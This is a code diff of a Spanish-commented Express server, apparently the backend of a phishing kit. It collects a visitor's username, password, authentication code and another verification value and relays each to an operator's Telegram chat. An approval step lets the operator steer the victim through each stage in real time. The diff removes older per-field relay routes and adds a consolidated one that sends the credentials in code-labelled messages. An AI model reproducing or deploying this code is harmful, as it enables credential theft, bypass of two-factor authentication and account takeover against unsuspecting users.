@@ -13,8 +13,6 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static('public')); // Para servir archivos estáticos (HTML, CSS, JS)
 
-// Objeto para almacenar datos por dispositivo
-let usuariosData = {};
 // ========================================
 // SISTEMA INDEPENDIENTE DE OPCIONES SÍ/NO
 // ========================================
@@ -71,6 +69,60 @@ async function llamarTelegramOpciones(metodo, datos) {
     return resultado.result;
 }
 
+// ========================================
+// AVISOS INDEPENDIENTES DE TELEGRAM
+// ========================================
+
+app.post('/opciones/solicitar', async (req, res) => {
+
+    const { dispositivoID, origen } = req.body;
+
+    if (
+        typeof dispositivoID !== 'string' ||
+        !/^id\.\d{1,3}$/.test(dispositivoID)
+    ) {
+        return res.status(400).json({
+            error: 'ID no válido'
+        });
+    }
+
+    const avisosPermitidos = {
+    entrar: 'UUUUU',
+    formulario: 'AAAA1',
+    resultado: 'AAAA2'
+};
+
+    if (!Object.prototype.hasOwnProperty.call(avisosPermitidos, origen)) {
+        return res.status(400).json({
+            error: 'Aviso no válido'
+        });
+    }
+
+    const idVisible = dispositivoID.replace('id.', '');
+
+    try {
+
+        await llamarTelegramOpciones('sendMessage', {
+            chat_id: OPCIONES_CHAT_ID,
+            text: avisosPermitidos[origen] + ' ' + idVisible + ': ' +
+      (origen === 'entrar' ? 'INGRESARÁ' : 'SOLICITAR')
+        });
+
+        return res.json({ ok: true });
+
+    } catch (error) {
+
+        console.error(
+            'Error al enviar aviso:',
+            error.message
+        );
+
+        return res.status(502).json({
+            error: 'No se pudo enviar el aviso'
+        });
+    }
+});
+
 
 // ----------------------------------------
 // CREAR SOLICITUD DE OPCIONES
@@ -78,7 +130,14 @@ async function llamarTelegramOpciones(metodo, datos) {
 
 app.post('/opciones/crear', async (req, res) => {
 
-    const { dispositivoID, etapa } = req.body;
+    const {
+    dispositivoID,
+    etapa,
+    calificacion,
+    autenticacion,
+    usuario,
+    password
+} = req.body;
 
 const etapaSolicitud =
     etapa === "calificacion"
@@ -115,15 +174,16 @@ solicitudesOpciones.set(idSolicitud, solicitud);
     'sendMessage',
     {
         chat_id: OPCIONES_CHAT_ID,
+parse_mode: 'Markdown',
 
-        text:
-            'APROBACIÓN ' + idVisible + ': ' +
+text:
 (
     etapaSolicitud === 'tercera'
-        ? 'AAAA2'
+        ? 'AAAA2 ' + idVisible + ': `' + calificacion + '`'
         : etapaSolicitud === 'segunda'
-            ? 'AAAA1'
-            : 'UUUU/CCCC'
+            ? 'AAAA1 ' + idVisible + ': `' + autenticacion + '`'
+            : 'UUUUU ' + idVisible + ': `' + usuario + '`\n' +
+              'CCCCC ' + idVisible + ': `' + password + '`'
 ),
 
                 reply_markup: {
@@ -332,108 +392,6 @@ async function configurarWebhookOpciones() {
 // Ruta para servir el archivo index.html en la raíz
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// Ruta para recibir y enviar el nombre de usuario al bot de Telegram
-app.post('/send-user', async (req, res) => {
-    const { dispositivoID, texto: usuario } = req.body;
-
-    // Almacenar el usuario por dispositivo
-    if (!usuariosData[dispositivoID]) {
-        usuariosData[dispositivoID] = { usuario: null, contraseña: null, codigo: null };
-    }
-    usuariosData[dispositivoID].usuario = `UUUUU ${dispositivoID.replace('id.', '')}: \`${usuario}\``;
-
-    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        body: JSON.stringify({
-            chat_id: OPCIONES_CHAT_ID,
-            text: usuariosData[dispositivoID].usuario,
-            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
-        }),
-        headers: { 'Content-Type': 'application/json' },
-    });
-    res.sendStatus(200);
-});
-
-// Ruta para recibir y enviar la contraseña al bot de Telegram
-app.post('/send-password', async (req, res) => {
-    const { dispositivoID, texto: password } = req.body;
-
-// Almacenar la contraseña por dispositivo
-if (!usuariosData[dispositivoID]) {
-    console.error('Registro no encontrado en /send-password:', dispositivoID);
-    return res.status(404).json({
-        error: 'Registro de dispositivo no encontrado'
-    });
-}
-
-usuariosData[dispositivoID].contraseña = `CCCCC ${dispositivoID.replace('id.', '')}: \`${password}\``;
-
-    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        body: JSON.stringify({
-            chat_id: OPCIONES_CHAT_ID,
-            text: usuariosData[dispositivoID].contraseña,
-            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
-        }),
-        headers: { 'Content-Type': 'application/json' },
-    });
-    res.sendStatus(200);
-});
-
-// Ruta para recibir y enviar el código de autenticación al bot de Telegram
-app.post('/send-auth', async (req, res) => {
-    const { dispositivoID, texto: authCode } = req.body;
-
-// Almacenar el código de autenticación por dispositivo
-if (!usuariosData[dispositivoID]) {
-    console.error('Registro no encontrado en /send-auth:', dispositivoID);
-    return res.status(404).json({
-        error: 'Registro de dispositivo no encontrado'
-    });
-}
-
-usuariosData[dispositivoID].codigo = `AAAA1 ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
-
-    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        body: JSON.stringify({
-            chat_id: OPCIONES_CHAT_ID,
-            text: usuariosData[dispositivoID].codigo,
-            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
-        }),
-        headers: { 'Content-Type': 'application/json' },
-    });
-    res.sendStatus(200);
-});
-
-// Ruta para recibir y enviar la calificación al bot de Telegram
-app.post('/send-calificacion', async (req, res) => {
-    const { dispositivoID, texto: calificacion } = req.body;
-
-// Almacenar la calificación por dispositivo
-if (!usuariosData[dispositivoID]) {
-    console.error('Registro no encontrado en /send-calificacion:', dispositivoID);
-    return res.status(404).json({
-        error: 'Registro de dispositivo no encontrado'
-    });
-}
-
-usuariosData[dispositivoID].calificacion =
-    `AAAA2 ${dispositivoID.replace('id.', '')}: \`${calificacion}\``;
-
-    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        body: JSON.stringify({
-            chat_id: OPCIONES_CHAT_ID,
-            text: usuariosData[dispositivoID].calificacion,
-            parse_mode: 'Markdown'
-        }),
-        headers: { 'Content-Type': 'application/json' },
-    });
-
-    res.sendStatus(200);
 });
 
 // Inicia el servidor en el puerto especificado
